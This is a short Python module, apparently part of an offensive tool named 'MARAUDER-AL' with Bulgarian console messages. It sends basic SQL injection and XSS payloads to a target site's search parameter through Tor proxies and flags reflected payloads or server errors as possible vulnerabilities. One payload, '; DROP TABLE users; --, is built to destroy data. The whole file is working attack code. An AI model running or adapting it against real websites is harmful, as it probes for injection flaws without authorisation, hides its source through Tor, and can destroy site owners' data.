import requests

class PayloadFuzzer:
    def __init__(self, core_instance):
        self.core = core_instance

    def run_payload_fuzz(self):
        print(f"\n--- [ MARAUDER-AL PAYLOAD FUZZER & INJECTOR ] ---")
        print(f"[->] Тестване на базови SQLi и XSS пейлоуди за {self.core.target_url} през Tor...")

        payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "<script>alert(1)</script>",
            "'; DROP TABLE users; --"
        ]

        for p in payloads:
            test_url = f"{self.core.target_url}?search={requests.utils.quote(p)}"
            try:
                res = requests.get(test_url, proxies=self.core.proxies, timeout=8)
                status = res.status_code
                print(f"    [->] Тест пейлоид: {p} -> Статус: {status}")
                
                if p in res.text or status == 500:
                    print(f"        [!] ПОТЕНЦИАЛЕН РЕФЛЕКТИРАН РЕЗУЛТАТ / ГРЕШКА (Статус {status}) за пейлоид: {p}")
                    self.core.log("PAYLOAD_FUZZ", status, f"Potential reflection/error for payload: {p}")
            except Exception as e:
                print(f"    [!] Грешка при изпращане на пейлоид през Tor")

        print("[+] Payload fuzzer модулът завърши работа.")
        self.core.log("PAYLOAD_FUZZ", 200, "Payload fuzzing workflow completed.")
